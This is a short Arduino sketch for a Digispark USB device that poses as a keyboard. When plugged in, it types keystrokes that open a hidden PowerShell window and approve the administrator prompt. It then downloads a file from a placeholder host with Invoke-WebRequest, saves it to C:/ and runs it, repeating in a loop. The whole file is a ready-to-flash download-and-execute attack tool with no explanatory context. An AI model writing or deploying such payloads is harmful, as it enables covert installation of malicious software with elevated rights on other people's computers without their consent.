#include "DigiKeyboard.h"
void setup() {
  pinMode(1, OUTPUT);
}
void loop() {
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  DigiKeyboard.print("powershell -windowstyle hidden");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("$source = \"http://HOST:PORT/FILENAME\"; $destination = \"C:/FILENAME\"; Invoke-WebRequest $source -OutFile $destination;");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print("start-process C:/FILENAME");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
